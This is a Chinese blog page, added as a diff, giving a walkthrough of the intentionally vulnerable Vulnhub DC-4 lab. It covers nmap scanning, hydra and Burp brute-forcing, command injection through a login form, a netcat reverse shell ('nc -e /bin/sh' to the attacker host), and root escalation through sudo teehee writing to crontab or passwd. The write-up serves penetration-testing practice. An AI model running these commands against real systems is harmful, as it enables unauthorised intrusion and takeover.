@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>DC-4 复现 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Vulnhub 之 DC-4前言DC已经做了一半了，前三次都是基于初学者的，这次的难度就提升了，适合初学者和入 门的伙伴。 还是按照常例看看作者是怎么描述的吧。 下载地址描述12345678DC-4是另一个专门建造的脆弱实验室，目的是获得渗透测试领域的经验。与以前的DC版本不同，这个版本主要是为初学者/中间用户设计的。只有一面旗帜，但技术上来说，有多个入口，就像上次一样，没有线索。必须具备Linu">
+<meta name="keywords" content="远程命令执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-4 复现">
+<meta property="og:url" content="http://yoursite.com/2019/10/04/Vulnhub靶机之DC-4/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Vulnhub 之 DC-4前言DC已经做了一半了，前三次都是基于初学者的，这次的难度就提升了，适合初学者和入 门的伙伴。 还是按照常例看看作者是怎么描述的吧。 下载地址描述12345678DC-4是另一个专门建造的脆弱实验室，目的是获得渗透测试领域的经验。与以前的DC版本不同，这个版本主要是为初学者/中间用户设计的。只有一面旗帜，但技术上来说，有多个入口，就像上次一样，没有线索。必须具备Linu">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721142149.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721143438.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721144835.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721145420.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721151611.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721161839.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162107.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162638.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721163345.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721172645.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165049.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165234.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171456.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171755.png">
+<meta property="og:updated_time" content="2019-09-04T03:56:00.588Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DC-4 复现">
+<meta name="twitter:description" content="Vulnhub 之 DC-4前言DC已经做了一半了，前三次都是基于初学者的，这次的难度就提升了，适合初学者和入 门的伙伴。 还是按照常例看看作者是怎么描述的吧。 下载地址描述12345678DC-4是另一个专门建造的脆弱实验室，目的是获得渗透测试领域的经验。与以前的DC版本不同，这个版本主要是为初学者/中间用户设计的。只有一面旗帜，但技术上来说，有多个入口，就像上次一样，没有线索。必须具备Linu">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721142149.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Vulnhub靶机之DC-4" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/Vulnhub靶机之DC-4/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.045Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/靶机/">靶机</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DC-4 复现
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Vulnhub-之-DC-4"><a href="#Vulnhub-之-DC-4" class="headerlink" title="Vulnhub 之 DC-4"></a>Vulnhub 之 DC-4</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DC已经做了一半了，前三次都是基于初学者的，这次的难度就提升了，适合初学者和入</p>
+<p>门的伙伴。</p>
+<p>还是按照常例看看作者是怎么描述的吧。</p>
+<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DC-4是另一个专门建造的脆弱实验室，目的是获得渗透测试领域的经验。</span><br><span class="line"></span><br><span class="line">与以前的DC版本不同，这个版本主要是为初学者/中间用户设计的。只有一面旗帜，但技术上来说，有多个入口，就像上次一样，没有线索。</span><br><span class="line"></span><br><span class="line">必须具备Linux技能和熟悉Linux命令行，就像一些基本渗透测试工具的经验一样。</span><br><span class="line"></span><br><span class="line">对于初学者来说，谷歌可能会有很大的帮助，但是你可以随时在@DCAU7发推给我寻求帮助，让你重新开始。但是请注意:我不会给你答案，相反，我会给你一个如何前进的想法。</span><br></pre></td></tr></table></figure>
+
+<p>所以说，谷歌真的很万能。O(∩<em>∩)O哈哈~</em></p>
+<h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>记得修改DC-4的网络为NAT模式</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali : 192.168.248.130</span><br><span class="line"></span><br><span class="line">DC-4 : 192.168.248.128</span><br></pre></td></tr></table></figure>
+
+<h2 id="靶机复现"><a href="#靶机复现" class="headerlink" title="靶机复现"></a>靶机复现</h2><ul>
+<li><p>扫描网段</p>
+<p><code>nmap -sn 192.168.248.0/24</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721142149.png" alt></p>
+<p>发现目标ip ： 192.168.248.128</p>
+</li>
+<li><p>扫描端口</p>
+<p><code>nmap -sS 192.168.248.128</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721143438.png" alt></p>
+</li>
+<li><p>尝试爆破ssh</p>
+<p><code>hydra  -l root -P /root/Desktop/weakpass.txt -t 5 ssh://192.168.248.128</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721144835.png" alt></p>
+<p>一般破解需要时间所以我就做一个演示</p>
+</li>
+<li><p>网站搜寻线索</p>
+<p>发现是一个登录框，</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721145420.png" alt></p>
+<p>并且没有登录限制，尝试爆破</p>
+<p>可以使用hydra爆破，这里我使用burp做测试</p>
+<p>设置为<code>Cluster bomb</code>,用户给admin和root ，密码采用弱口令字典这个网上挺多的，或者使用hydra的默认字典也可以，然后线程跑高点 ， 我这里给burp设置的20，大概不到一分钟就出来了。</p>
+</li>
+</ul>
+<p>  <img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721151611.png" alt></p>
+<p>  这里只要登录成功后之后的登录都是636了</p>
+<ul>
+<li><p>登录发现</p>
+<p>有三个命令可以运行，然后抓包查看发现可以在radio这块执行了系统命令，那么是否可以执行其他的命令</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721161839.png" alt></p>
+<p>尝试执行<code>whoami</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162107.png" alt></p>
+<p>既然可以执行一些简单的命令，我们就可以尝试去反弹shell</p>
+<p>命令：<code>nc -e /bin/sh 192.168.248.130 4444</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162638.png" alt></p>
+<p>获取交互模式</p>
+<p>命令：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>之后在home的jim目录下发现了一个旧密码的备份</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721163345.png" alt></p>
+<p>或许可以尝试用它去爆破ssh</p>
+<p>命令：<code>chydra  -L /root/Desktop/user.txt -P /root/Desktop/dc_pass.txt -t 5 ssh://192.168.248.128</code></p>
+<p>等待是漫长的，要有耐心</p>
+<p>终于出来了一个  用户名：<code>jim</code> 密码：<code>jibril04</code><br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721172645.png" alt></p>
+<p>切换到jim用户下，打开mbox查看</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165049.png" alt></p>
+<p>有邮件，去mail下查看，发现了jim文件获取到jim的密码</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165234.png" alt></p>
+</li>
+<li><p>登录charles</p>
+<p>密码： <code>^xHhA&amp;hvim0y</code></p>
+<p>命令：<code>sudo -l</code>查看权限 发现可以不需要密码执行teehee</p>
+<p>百度得到提权方式</p>
+<p>1 通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171456.png" alt></p>
+<p>2 还有个2呢，多个想法多个活路</p>
+<p>通过添加用户到passwd，设置其权限，之后su 访问即可获得root</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171755.png" alt></p>
+<p>所以，最好不要给用户sudo权限，或者限制sudo权限的，这样才能保证网络安全</p>
+</li>
+</ul>
+<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>今天的靶机奉上各位看官，过程简单，主要掌握提权的思路和前期爆破的等待。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/Vulnhub靶机之DC-4/" data-id="ck1avz65p000lacv4u9etmnep" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/远程命令执行/">远程命令执行</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/04/Vulnhub之DC-1[find提权]/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Vulnhub之DC-1 find 提权骚思路
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/04/Vulnhub靶机之DC-3/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Vulnhub之DC-3 joomla注入和ubutnu16.04 提权</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB安全/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/sql注入/">sql注入</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/shell/">shell</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/实用技术/">实用技术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/">DVWA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Suid-提权/">Suid 提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git提权/">git提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http方法利用/">http方法利用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/joomla-cms-注入/">joomla cms 注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js反弹shell/">js反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suid提权/">suid提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu-16-04-bpf-提权/">ubuntu 16.04 bpf 提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vmware/">vmware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wireshark/">wireshark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/提权/">提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件删除/">文件删除</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/时间盲注/">时间盲注</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/本地文件包含/">本地文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂项/">杂项</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞/">漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/语法/">语法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程命令执行/">远程命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程文件包含/">远程文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/错误解决方案/">错误解决方案</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/DVWA/" style="font-size: 20px;">DVWA</a> <a href="/tags/Suid-提权/" style="font-size: 10px;">Suid 提权</a> <a href="/tags/git提权/" style="font-size: 10px;">git提权</a> <a href="/tags/http方法利用/" style="font-size: 10px;">http方法利用</a> <a href="/tags/joomla-cms-注入/" style="font-size: 10px;">joomla cms 注入</a> <a href="/tags/js反弹shell/" style="font-size: 10px;">js反弹shell</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/suid提权/" style="font-size: 10px;">suid提权</a> <a href="/tags/ubuntu-16-04-bpf-提权/" style="font-size: 10px;">ubuntu 16.04 bpf 提权</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/文件删除/" style="font-size: 10px;">文件删除</a> <a href="/tags/时间盲注/" style="font-size: 10px;">时间盲注</a> <a href="/tags/本地文件包含/" style="font-size: 10px;">本地文件包含</a> <a href="/tags/杂项/" style="font-size: 20px;">杂项</a> <a href="/tags/漏洞/" style="font-size: 20px;">漏洞</a> <a href="/tags/语法/" style="font-size: 10px;">语法</a> <a href="/tags/远程命令执行/" style="font-size: 10px;">远程命令执行</a> <a href="/tags/远程文件包含/" style="font-size: 10px;">远程文件包含</a> <a href="/tags/错误解决方案/" style="font-size: 10px;">错误解决方案</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/10/04/远程文件包含错误解决方法/">错误提示【URL file-access is disabled in the server configuration in】解决</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/删除github的某个文件/">删除github的某个文件</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/配置nat实现网络互通/">配置NAT实现网络互通</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/利用js文件反弹shell/">利用js文件反弹shell</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/解决wireshark没有捕获端口的问题/">解决wireshark没有捕获端口的问题</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
